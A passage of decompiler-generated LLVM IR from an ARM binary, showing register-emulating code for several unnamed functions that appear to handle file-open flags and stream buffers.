  %v0_d5a4 = phi i32 [ %v0_d5a4.pre, %dec_label_pc_d588.dec_label_pc_d5a0_crit_edge ], [ %v0_d57c, %dec_label_pc_d57c ]
  %v0_d5a0 = phi i32 [ %v0_d5a0.pre, %dec_label_pc_d588.dec_label_pc_d5a0_crit_edge ], [ %v1_d57c, %dec_label_pc_d57c ]
  %v1_d5a0 = and i32 %v0_d5a0, 131072
  store i32 %v1_d5a0, i32* %r3.global-to-local, align 4
  %v2_d5a4 = or i32 %v1_d5a0, %v0_d5a4
  store i32 %v2_d5a4, i32* @r4, align 4
  br label %dec_label_pc_d5d0

dec_label_pc_d5ac:                                ; preds = %dec_label_pc_d554
  %v7_d5ac = icmp eq i32 %v0_d5ac, -1
  store i1 %v7_d5ac, i1* %cpsr_z.global-to-local, align 1
  %v0_d5b8.pre = load i32, i32* @r4, align 4
  br i1 %v7_d5ac, label %dec_label_pc_d5ac._crit_edge, label %bb35

bb35:                                             ; preds = %dec_label_pc_d5ac
  %v2_d5b0 = or i32 %v0_d5b8.pre, 131072
  store i32 %v2_d5b0, i32* @r4, align 4
  br label %dec_label_pc_d5ac._crit_edge

dec_label_pc_d5ac._crit_edge:                     ; preds = %dec_label_pc_d5ac, %bb35
  %v0_d5b8 = phi i32 [ %v2_d5b0, %bb35 ], [ %v0_d5b8.pre, %dec_label_pc_d5ac ]
  %v0_d5b4 = load i32, i32* @r6, align 4
  store i32 %v0_d5b4, i32* %r0.global-to-local, align 4
  store i32 %v0_d5b8, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_d5c0 = inttoptr i32 %v0_d5b4 to i8*
  %v3_d5c0 = call i32 @function_113a4(i8* %v2_d5c0, i32 %v0_d5b8)
  store i32 %v3_d5c0, i32* %r0.global-to-local, align 4
  %v1_d5c4 = icmp slt i32 %v3_d5c0, 0
  %v2_d5c4 = icmp eq i32 %v3_d5c0, 0
  store i1 %v2_d5c4, i1* %cpsr_z.global-to-local, align 1
  %v1_d5c8 = load i32, i32* @r8, align 4
  %v2_d5c8 = add i32 %v1_d5c8, 4
  %v3_d5c8 = inttoptr i32 %v2_d5c8 to i32*
  store i32 %v3_d5c0, i32* %v3_d5c8, align 4
  br i1 %v1_d5c4, label %dec_label_pc_d4e4, label %dec_label_pc_d5d0

dec_label_pc_d5d0:                                ; preds = %dec_label_pc_d5ac._crit_edge, %dec_label_pc_d5a0
  %v0_d5d0 = load i32, i32* @r8, align 4
  %v1_d5d0 = inttoptr i32 %v0_d5d0 to i32*
  %v2_d5d0 = load i32, i32* %v1_d5d0, align 4
  %v1_d5d4 = and i32 %v2_d5d0, 8192
  store i32 %v1_d5d4, i32* %r3.global-to-local, align 4
  %v3_d5d81 = udiv i32 %v1_d5d4, 256
  store i32 %v3_d5d81, i32* %r2.global-to-local, align 4
  %v1_d5dc = trunc i32 %v3_d5d81 to i8
  %v3_d5dc = add i32 %v0_d5d0, 1
  %v4_d5dc = inttoptr i32 %v3_d5dc to i8*
  store i8 %v1_d5dc, i8* %v4_d5dc, align 1
  %v0_d5e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_d5e0 = trunc i32 %v0_d5e0 to i8
  %v2_d5e0 = load i32, i32* @r8, align 4
  %v3_d5e0 = inttoptr i32 %v2_d5e0 to i8*
  store i8 %v1_d5e0, i8* %v3_d5e0, align 1
  %v0_d5e4 = load i32, i32* @r4, align 4
  %v1_d5e4 = and i32 %v0_d5e4, 131072
  store i32 %v1_d5e4, i32* %r1.global-to-local, align 4
  %v2_d5e4 = icmp eq i32 %v1_d5e4, 0
  store i1 %v2_d5e4, i1* %cpsr_z.global-to-local, align 1
  %v0_d5e8 = load i32, i32* @r8, align 4
  %v1_d5e8 = add i32 %v0_d5e8, 1
  %v2_d5e8 = inttoptr i32 %v1_d5e8 to i8*
  %v3_d5e8 = load i8, i8* %v2_d5e8, align 1
  %v4_d5e8 = zext i8 %v3_d5e8 to i32
  %v1_d5ec = inttoptr i32 %v0_d5e8 to i8*
  %v2_d5ec = load i8, i8* %v1_d5ec, align 1
  %v3_d5ec = zext i8 %v2_d5ec to i32
  store i32 %v3_d5ec, i32* %r3.global-to-local, align 4
  br i1 %v2_d5e4, label %bb37, label %bb36

bb36:                                             ; preds = %dec_label_pc_d5d0
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb37

bb37:                                             ; preds = %dec_label_pc_d5d0, %bb36
  %v0_d600 = phi i32 [ 0, %dec_label_pc_d5d0 ], [ 32768, %bb36 ]
  %v1_d5f4 = and i32 %v0_d5e4, 1024
  store i32 %v1_d5f4, i32* %r0.global-to-local, align 4
  %v4_d5fc = mul nuw nsw i32 %v4_d5e8, 256
  %v5_d5fc = or i32 %v3_d5ec, %v4_d5fc
  %v2_d600 = or i32 %v0_d600, %v1_d5f4
  store i32 %v2_d600, i32* %r1.global-to-local, align 4
  %v2_d608 = or i32 %v5_d5fc, %v2_d600
  %v1_d5f8 = mul i32 %v0_d5e4, 16
  %v1_d604 = and i32 %v1_d5f8, 48
  %v1_d60c = add nuw nsw i32 %v1_d604, 16
  %v4_d610 = xor i32 %v1_d60c, 48
  %v5_d610 = or i32 %v2_d608, %v4_d610
  store i32 %v5_d610, i32* %r3.global-to-local, align 4
  %v3_d61419 = udiv i32 %v2_d608, 256
  store i32 %v3_d61419, i32* %r2.global-to-local, align 4
  %v1_d618 = trunc i32 %v3_d61419 to i8
  store i8 %v1_d618, i8* %v2_d5e8, align 1
  %v0_d61c = load i32, i32* %r3.global-to-local, align 4
  %v1_d61c = trunc i32 %v0_d61c to i8
  %v2_d61c = load i32, i32* @r8, align 4
  %v3_d61c = inttoptr i32 %v2_d61c to i8*
  store i8 %v1_d61c, i8* %v3_d61c, align 1
  %v0_d620 = call i32 @function_cec4()
  store i32 %v0_d620, i32* %r0.global-to-local, align 4
  %v0_d624 = load i32, i32* @r8, align 4
  %v1_d624 = add i32 %v0_d624, 1
  %v2_d624 = inttoptr i32 %v1_d624 to i8*
  %v3_d624 = load i8, i8* %v2_d624, align 1
  %v4_d624 = zext i8 %v3_d624 to i32
  store i32 %v4_d624, i32* @r3, align 4
  %v1_d628 = inttoptr i32 %v0_d624 to i8*
  %v2_d628 = load i8, i8* %v1_d628, align 1
  %v3_d628 = zext i8 %v2_d628 to i32
  store i32 %v0_d620, i32* @r6, align 4
  %v1_d630 = add i32 %v0_d624, 4
  %v2_d630 = inttoptr i32 %v1_d630 to i32*
  %v3_d630 = load i32, i32* %v2_d630, align 4
  store i32 %v3_d630, i32* @r0, align 4
  %v4_d634 = mul nuw nsw i32 %v4_d624, 256
  %v5_d634 = or i32 %v3_d628, %v4_d634
  store i32 %v5_d634, i32* @r4, align 4
  %v1_d638 = inttoptr i32 %v0_d620 to i32*
  %v2_d638 = load i32, i32* %v1_d638, align 4
  store i32 %v2_d638, i32* @r5, align 4
  %v1_d63c = call i32 @function_f51c(i32 %v3_d630)
  store i32 %v1_d63c, i32* %r0.global-to-local, align 4
  %v0_d640 = load i32, i32* @r4, align 4
  %v4_d640 = mul i32 %v1_d63c, 256
  %v5_d640 = or i32 %v0_d640, %v4_d640
  store i32 %v5_d640, i32* @r4, align 4
  %v3_d644 = sdiv i32 %v5_d640, 256
  store i32 %v3_d644, i32* %r3.global-to-local, align 4
  %v1_d648 = trunc i32 %v3_d644 to i8
  %v2_d648 = load i32, i32* @r8, align 4
  %v3_d648 = add i32 %v2_d648, 1
  %v4_d648 = inttoptr i32 %v3_d648 to i8*
  store i8 %v1_d648, i8* %v4_d648, align 1
  %v0_d64c = load i32, i32* @r4, align 4
  %v1_d64c = trunc i32 %v0_d64c to i8
  %v2_d64c = load i32, i32* @r8, align 4
  %v3_d64c = inttoptr i32 %v2_d64c to i8*
  store i8 %v1_d64c, i8* %v3_d64c, align 1
  %v0_d650 = load i32, i32* @r5, align 4
  %v1_d650 = load i32, i32* @r6, align 4
  %v2_d650 = inttoptr i32 %v1_d650 to i32*
  store i32 %v0_d650, i32* %v2_d650, align 4
  %v0_d654 = load i32, i32* @r8, align 4
  %v1_d654 = add i32 %v0_d654, 8
  %v2_d654 = inttoptr i32 %v1_d654 to i32*
  %v3_d654 = load i32, i32* %v2_d654, align 4
  store i32 %v3_d654, i32* %r3.global-to-local, align 4
  %v2_d658 = icmp eq i32 %v3_d654, 0
  store i1 %v2_d658, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d658, label %dec_label_pc_d660, label %bb38

dec_label_pc_d660:                                ; preds = %bb37
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_d664 = call i32 @function_fc78(i32 4096)
  store i32 %v1_d664, i32* %r0.global-to-local, align 4
  %v2_d668 = icmp eq i32 %v1_d664, 0
  store i1 %v2_d668, i1* %cpsr_z.global-to-local, align 1
  %v1_d67c.pre = load i32, i32* @r8, align 4
  br i1 %v2_d668, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_d660
  %v2_d67c20 = add i32 %v1_d67c.pre, 8
  %v3_d67c21 = inttoptr i32 %v2_d67c20 to i32*
  store i32 0, i32* %v3_d67c21, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_d660
  %v2_d66c = inttoptr i32 %v1_d67c.pre to i32*
  %v3_d66c = load i32, i32* %v2_d66c, align 4
  %v2_d670 = or i32 %v3_d66c, 16384
  store i32 %v2_d670, i32* %r3.global-to-local, align 4
  %v2_d674 = add i32 %v1_d664, 4096
  store i32 %v2_d674, i32* %r2.global-to-local, align 4
  %v4_d678 = sdiv i32 %v2_d670, 256
  store i32 %v4_d678, i32* %r1.global-to-local, align 4
  %v2_d67c = add i32 %v1_d67c.pre, 8
  %v3_d67c = inttoptr i32 %v2_d67c to i32*
  store i32 %v1_d664, i32* %v3_d67c, align 4
  %v1_d680 = load i32, i32* %r2.global-to-local, align 4
  %v2_d680 = load i32, i32* @r8, align 4
  %v3_d680 = add i32 %v2_d680, 12
  %v4_d680 = inttoptr i32 %v3_d680 to i32*
  store i32 %v1_d680, i32* %v4_d680, align 4
  %v1_d684 = load i32, i32* %r1.global-to-local, align 4
  %v2_d684 = trunc i32 %v1_d684 to i8
  %v3_d684 = load i32, i32* @r8, align 4
  %v4_d684 = add i32 %v3_d684, 1
  %v5_d684 = inttoptr i32 %v4_d684 to i8*
  store i8 %v2_d684, i8* %v5_d684, align 1
  %v0_d688.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d688.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_d688 = load i32, i32* %r3.global-to-local, align 4
  %v2_d688 = trunc i32 %v1_d688 to i8
  %v3_d688 = load i32, i32* @r8, align 4
  %v4_d688 = inttoptr i32 %v3_d688 to i8*
  store i8 %v2_d688, i8* %v4_d688, align 1
  %v0_d68c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d68c.pr.pr, label %.thread10, label %bb38

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_d68c = load i32, i32* @r8, align 4
  %v3_d68c = add i32 %v2_d68c, 12
  %v4_d68c = inttoptr i32 %v3_d68c to i32*
  store i32 %v1_d664, i32* %v4_d68c, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18140.320 to i32), i32* %r3.global-to-local, align 4
  %v2_d698 = load i32, i32* @r8, align 4
  %v3_d698 = add i32 %v2_d698, 2
  %v4_d698 = inttoptr i32 %v3_d698 to i8*
  store i8 0, i8* %v4_d698, align 1
  %v0_d69c = load i32, i32* @r8, align 4
  %v1_d69c = add i32 %v0_d69c, 1
  %v2_d69c = inttoptr i32 %v1_d69c to i8*
  %v3_d69c = load i8, i8* %v2_d69c, align 1
  %v4_d69c = zext i8 %v3_d69c to i32
  store i32 %v4_d69c, i32* %r2.global-to-local, align 4
  %v2_d6a0 = load i32, i32* @global_var_18140.320, align 4
  store i32 %v2_d6a0, i32* %r1.global-to-local, align 4
  %v1_d6a4 = add i32 %v0_d69c, 8
  %v2_d6a4 = inttoptr i32 %v1_d6a4 to i32*
  %v3_d6a4 = load i32, i32* %v2_d6a4, align 4
  store i32 %v3_d6a4, i32* %r3.global-to-local, align 4
  %v1_d6a8 = and i32 %v4_d69c, 32
  %v2_d6a8 = icmp eq i32 %v1_d6a8, 0
  store i1 %v2_d6a8, i1* %cpsr_z.global-to-local, align 1
  %v2_d6ac = add i32 %v0_d69c, 20
  %v3_d6ac = inttoptr i32 %v2_d6ac to i32*
  store i32 %v3_d6a4, i32* %v3_d6ac, align 4
  %v0_d6b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_d6b0 = load i32, i32* @r8, align 4
  %v2_d6b0 = add i32 %v1_d6b0, 44
  %v3_d6b0 = inttoptr i32 %v2_d6b0 to i32*
  store i32 %v0_d6b0, i32* %v3_d6b0, align 4
  %v0_d6b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d6b4 = load i32, i32* @r8, align 4
  %v2_d6b4 = add i32 %v1_d6b4, 52
  %v3_d6b4 = inttoptr i32 %v2_d6b4 to i32*
  store i32 %v0_d6b4, i32* %v3_d6b4, align 4
  %v0_d6b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d6b8 = load i32, i32* @r8, align 4
  %v2_d6b8 = add i32 %v1_d6b8, 24
  %v3_d6b8 = inttoptr i32 %v2_d6b8 to i32*
  store i32 %v0_d6b8, i32* %v3_d6b8, align 4
  %v0_d6bc = load i32, i32* %r3.global-to-local, align 4
  %v1_d6bc = load i32, i32* @r8, align 4
  %v2_d6bc = add i32 %v1_d6bc, 28
  %v3_d6bc = inttoptr i32 %v2_d6bc to i32*
  store i32 %v0_d6bc, i32* %v3_d6bc, align 4
  %v0_d6c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_d6c0 = load i32, i32* @r8, align 4
  %v2_d6c0 = add i32 %v1_d6c0, 16
  %v3_d6c0 = inttoptr i32 %v2_d6c0 to i32*
  store i32 %v0_d6c0, i32* %v3_d6c0, align 4
  br i1 %v2_d6a8, label %dec_label_pc_d754, label %dec_label_pc_d6c8

dec_label_pc_d6c8:                                ; preds = %bb38
  %v2_d6c8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_d6c8, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18128.287 to i32), i32* %r2.global-to-local, align 4
  %v1_d6e0 = call i32 @function_10d54()
  store i32 ptrtoint (i32* @global_var_18128.287 to i32), i32* %r0.global-to-local, align 4
  %v1_d6f0 = call i32 @function_10d4c()
  store i32 ptrtoint (i32* @global_var_18110.326 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_d4a4, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r1.global-to-local, align 4
  %v1_d704 = call i32 @function_10d54()
  store i32 ptrtoint (i32* @global_var_18110.326 to i32), i32* %r0.global-to-local, align 4
  %v1_d710 = call i32 @function_10d4c()
  store i32 ptrtoint (i32** @global_var_1810c.329 to i32), i32* %r2.global-to-local, align 4
  %v2_d718 = load i32, i32* bitcast (i32** @global_var_1810c.329 to i32*), align 4
  store i32 %v2_d718, i32* %r3.global-to-local, align 4
  store i32 %v2_d4a4, i32* @r0, align 4
  %v1_d720 = load i32, i32* @r8, align 4
  %v2_d720 = add i32 %v1_d720, 32
  %v3_d720 = inttoptr i32 %v2_d720 to i32*
  store i32 %v2_d718, i32* %v3_d720, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d72c = load i32, i32* @r8, align 4
  %v1_d72c = load i32, i32* %r2.global-to-local, align 4
  %v2_d72c = inttoptr i32 %v1_d72c to i32*
  store i32 %v0_d72c, i32* %v2_d72c, align 4
  %v1_d734 = call i32 @function_10d54()
  store i32 %v2_d6c8, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 55116, i32* @lr, align 4
  %v1_d748 = call i32 @function_10d54()
  store i32 %v1_d748, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d754

dec_label_pc_d750:                                ; preds = %dec_label_pc_d4e4, %dec_label_pc_d4d0, %dec_label_pc_d4f0
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_d754

dec_label_pc_d754:                                ; preds = %bb38, %dec_label_pc_d528, %dec_label_pc_d6c8, %dec_label_pc_d750
  %v0_d754 = load i32, i32* @r8, align 4
  store i32 %v0_d754, i32* %r0.global-to-local, align 4
  %v2_d75c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d75c, i32* @r4, align 4
  store i32 %v6_d498, i32* @r5, align 4
  store i32 %v9_d498, i32* @r6, align 4
  store i32 %v15_d498, i32* @r8, align 4
  ret i32 %v0_d754

; uselistorder directives
  uselistorder i32 %v1_d67c.pre, { 1, 0, 2 }
  uselistorder i32 %v3_d644, { 1, 0 }
  uselistorder i32 %v3_d5d81, { 1, 0 }
  uselistorder i32 %v0_d5b8, { 1, 0 }
  uselistorder i1 %v7_d5ac, { 1, 0 }
  uselistorder i32 %v1_d57c, { 1, 0 }
  uselistorder i32 %v0_d57c, { 1, 0 }
  uselistorder i32 %v1_d564, { 1, 0, 2 }
  uselistorder i32 %v1_d518, { 1, 0 }
  uselistorder i1 %v7_d4c4, { 1, 0 }
  uselistorder i1 %v7_d4b8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 1, 6, 7, 8, 9, 11, 10, 12, 14, 13, 16, 15, 18, 17, 4, 3, 19, 2, 20, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 8, 9 }
  uselistorder i8 114, { 1, 0 }
  uselistorder label %dec_label_pc_d754, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_d750, { 2, 0, 1 }
  uselistorder label %bb38, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb37, { 1, 0 }
  uselistorder label %dec_label_pc_d5ac._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_d554, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_d500, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d4d0, { 1, 2, 0 }
}

define i32 @function_d760(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d760:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_d760 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d760, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_d760
  %v3_d768 = and i32 %arg4, %arg3
  store i32 %v3_d768, i32* %r0.global-to-local, align 4
  %v2_d76c = trunc i32 %v3_d768 to i16
  %v4_d76c = inttoptr i32 %v3_d768 to i16*
  store i16 %v2_d76c, i16* %v4_d76c, align 2
  %v5_d76c = load i32, i32* @r6, align 4
  %v6_d76c = load i32, i32* %r0.global-to-local, align 4
  %v7_d76c = sub i32 %v6_d76c, %v5_d76c
  store i32 %v7_d76c, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_d760, %bb
  %v8_d76c = phi i32 [ %tmp, %dec_label_pc_d760 ], [ %v7_d76c, %bb ]
  ret i32 %v8_d76c

; uselistorder directives
  uselistorder i32 %v3_d768, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_d790() local_unnamed_addr {
dec_label_pc_d790:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d790 = load i32, i32* @r4, align 4
  store i32 %v3_d790, i32* %stack_var_-24, align 4
  %v9_d790 = load i32, i32* @r6, align 4
  %v0_d794 = call i32 @function_cec4()
  store i32 ptrtoint (i8** @global_var_18144.277 to i32), i32* @r4, align 4
  %v3_d79c = load i8, i8* @global_var_18145.332, align 1
  %v4_d79c = zext i8 %v3_d79c to i32
  store i32 %v4_d79c, i32* @r3, align 4
  %v2_d7a0 = load i8, i8* bitcast (i8** @global_var_18144.277 to i8*), align 4
  %v3_d7a0 = zext i8 %v2_d7a0 to i32
  store i32 %v0_d794, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_d7ac = mul nuw nsw i32 %v4_d79c, 256
  %v5_d7ac = or i32 %v3_d7a0, %v4_d7ac
  store i32 %v5_d7ac, i32* @r6, align 4
  %v1_d7b0 = inttoptr i32 %v0_d794 to i32*
  %v2_d7b0 = load i32, i32* %v1_d7b0, align 4
  store i32 %v2_d7b0, i32* %r8.global-to-local, align 4
  %v1_d7b4 = call i32 @function_f51c(i32 0)
  %v1_d7b8 = sub i32 1, %v1_d7b4
  %v0_d7bc = load i32, i32* @r6, align 4
  %v4_d7bc = mul i32 %v1_d7b8, 256
  %v5_d7bc = xor i32 %v4_d7bc, %v0_d7bc
  %v3_d7c0 = load i8, i8* @global_var_18195.333, align 1
  %v4_d7c0 = zext i8 %v3_d7c0 to i32
  store i32 %v4_d7c0, i32* @r3, align 4
  %v3_d7c4 = load i8, i8* @global_var_18194.278, align 1
  %v4_d7c4 = zext i8 %v3_d7c4 to i32
  %v3_d7c8 = sdiv i32 %v5_d7bc, 256
  store i32 1, i32* @r0, align 4
  %v4_d7d0 = mul nuw nsw i32 %v4_d7c0, 256
  %v5_d7d0 = or i32 %v4_d7c4, %v4_d7d0
  store i32 %v5_d7d0, i32* @r5, align 4
  %v1_d7d4 = trunc i32 %v3_d7c8 to i8
  store i8 %v1_d7d4, i8* @global_var_18145.332, align 1
  %v1_d7d8 = trunc i32 %v0_d7bc to i8
  %v2_d7d8 = load i32, i32* @r4, align 4
  %v3_d7d8 = inttoptr i32 %v2_d7d8 to i8*
  store i8 %v1_d7d8, i8* %v3_d7d8, align 1
  %v1_d7dc = call i32 @function_f51c(i32 1)
  %v1_d7e0 = sub i32 1, %v1_d7dc
  %v0_d7e4 = load i32, i32* @r5, align 4
  %v4_d7e4 = mul i32 %v1_d7e0, 256
  %v5_d7e4 = xor i32 %v4_d7e4, %v0_d7e4
  store i32 %v5_d7e4, i32* %r5.global-to-local, align 4
  %v3_d7e8 = sdiv i32 %v5_d7e4, 256
  %v1_d7ec = trunc i32 %v3_d7e8 to i8
  store i8 %v1_d7ec, i8* @global_var_18195.333, align 1
  %v0_d7f0 = load i32, i32* %r8.global-to-local, align 4
  %v1_d7f0 = load i32, i32* @r7, align 4
  %v2_d7f0 = inttoptr i32 %v1_d7f0 to i32*
  store i32 %v0_d7f0, i32* %v2_d7f0, align 4
  %v0_d7f4 = load i32, i32* %r5.global-to-local, align 4
  %v1_d7f4 = trunc i32 %v0_d7f4 to i8
  store i8 %v1_d7f4, i8* @global_var_18194.278, align 1
  %v2_d7f8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_d7f8, i32* @r4, align 4
  store i32 %v9_d790, i32* @r6, align 4
  ret i32 %v1_d7e0

; uselistorder directives
  uselistorder i32 %v1_d7e0, { 1, 0 }
  uselistorder i32 %v0_d7bc, { 1, 0 }
  uselistorder i8* @global_var_18194.278, { 1, 0 }
  uselistorder i8* @global_var_18195.333, { 1, 0 }
  uselistorder i32 (i32)* @function_f51c, { 1, 0, 2 }
  uselistorder i8* @global_var_18145.332, { 1, 0 }
}

define i32 @function_d800() local_unnamed_addr {
dec_label_pc_d800:
  store i32 ptrtoint (i32* @global_var_16234.335 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_d808 = call i32 @function_ef60()
  %v0_d80c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d80c, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_d800
  %v1_d80c = load i32, i32* @r1, align 4
  %v2_d80c = load i32, i32* @r4, align 4
  %v3_d80c = load i32, i32* @r2, align 4
  %v8_d80c = lshr i32 %v2_d80c, %v3_d80c
  %v9_d80c = and i32 %v8_d80c, %v1_d80c
  store i32 %v9_d80c, i32* @r6, align 4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_d800, %bb
  ret i32 %v0_d808

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_d810() local_unnamed_addr {
dec_label_pc_d810:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_d810 = load i32, i32* @r4, align 4
  store i32 %v3_d810, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_18110.326 to i32), i32* @r0, align 4
  %v0_d818 = call i32 @function_d800()
  store i32 ptrtoint (i32* @global_var_18128.287 to i32), i32* @r0, align 4
  %v0_d820 = call i32 @function_d800()
  store i32 ptrtoint (i32** @global_var_1810c.329 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_1810c.329 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_d87c6 = add i32 %storemerge5, 56
  store i32 %v1_d87c6, i32* @r5, align 4
  %v2_d8808 = icmp eq i32 %storemerge5, 0
  store i32 %v1_d87c6, i32* %r0.global-to-local, align 4
  br i1 %v2_d8808, label %dec_label_pc_d88c, label %dec_label_pc_d830

dec_label_pc_d830:                                ; preds = %dec_label_pc_d810, %dec_label_pc_d86c
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r3.global-to-local, align 4
  store i32 55356, i32* @lr, align 4
  %v1_d838 = call i32 @function_10d4c()
  %v2_d83c = icmp eq i32 %v1_d838, 0
  %v0_d840 = load i32, i32* @r5, align 4
  store i32 %v0_d840, i32* @r0, align 4
  br i1 %v2_d83c, label %dec_label_pc_d86c, label %dec_label_pc_d848

dec_label_pc_d848:                                ; preds = %dec_label_pc_d830
  %v0_d848 = load i32, i32* @r4, align 4
  %v1_d848 = add i32 %v0_d848, 8
  %v2_d848 = inttoptr i32 %v1_d848 to i32*
  %v3_d848 = load i32, i32* %v2_d848, align 4
  store i32 %v3_d848, i32* %r3.global-to-local, align 4
  %v3_d850 = inttoptr i32 %v0_d848 to i8*
  store i8 48, i8* %v3_d850, align 1
  %v2_d858 = load i32, i32* @r4, align 4
  %v3_d858 = add i32 %v2_d858, 1
  %v4_d858 = inttoptr i32 %v3_d858 to i8*
  store i8 0, i8* %v4_d858, align 1
  %v0_d85c = load i32, i32* %r3.global-to-local, align 4
  %v1_d85c = load i32, i32* @r4, align 4
  %v2_d85c = add i32 %v1_d85c, 20
  %v3_d85c = inttoptr i32 %v2_d85c to i32*
  store i32 %v0_d85c, i32* %v3_d85c, align 4
  %v0_d860 = load i32, i32* %r3.global-to-local, align 4
  %v1_d860 = load i32, i32* @r4, align 4
  %v2_d860 = add i32 %v1_d860, 24
  %v3_d860 = inttoptr i32 %v2_d860 to i32*
  store i32 %v0_d860, i32* %v3_d860, align 4
  %v0_d864 = load i32, i32* %r3.global-to-local, align 4
  %v1_d864 = load i32, i32* @r4, align 4
  %v2_d864 = add i32 %v1_d864, 28
  %v3_d864 = inttoptr i32 %v2_d864 to i32*
  store i32 %v0_d864, i32* %v3_d864, align 4
  %v0_d868 = load i32, i32* %r3.global-to-local, align 4
  %v1_d868 = load i32, i32* @r4, align 4
  %v2_d868 = add i32 %v1_d868, 16
  %v3_d868 = inttoptr i32 %v2_d868 to i32*
  store i32 %v0_d868, i32* %v3_d868, align 4
  br label %dec_label_pc_d86c

dec_label_pc_d86c:                                ; preds = %dec_label_pc_d830, %dec_label_pc_d848
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_d870 = load i32, i32* @r4, align 4
  %v2_d870 = add i32 %v1_d870, 52
  %v3_d870 = inttoptr i32 %v2_d870 to i32*
  store i32 1, i32* %v3_d870, align 4
  %v0_d874 = call i32 @function_d800()
  store i32 %v0_d874, i32* %r0.global-to-local, align 4
  %v0_d878 = load i32, i32* @r4, align 4
  %v1_d878 = add i32 %v0_d878, 32
  %v2_d878 = inttoptr i32 %v1_d878 to i32*
  %storemerge = load i32, i32* %v2_d878, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_d87c = add i32 %storemerge, 56
  store i32 %v1_d87c, i32* @r5, align 4
  %v2_d880 = icmp eq i32 %storemerge, 0
  store i32 %v1_d87c, i32* %r0.global-to-local, align 4
  br i1 %v2_d880, label %dec_label_pc_d87c.dec_label_pc_d88c_crit_edge, label %dec_label_pc_d830

dec_label_pc_d87c.dec_label_pc_d88c_crit_edge:    ; preds = %dec_label_pc_d86c
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1810c.329 to i32*), align 4
  br label %dec_label_pc_d88c

dec_label_pc_d88c:                                ; preds = %dec_label_pc_d87c.dec_label_pc_d88c_crit_edge, %dec_label_pc_d810
  %v11_d8b413 = phi i32 [ %v1_d87c, %dec_label_pc_d87c.dec_label_pc_d88c_crit_edge ], [ %v1_d87c6, %dec_label_pc_d810 ]
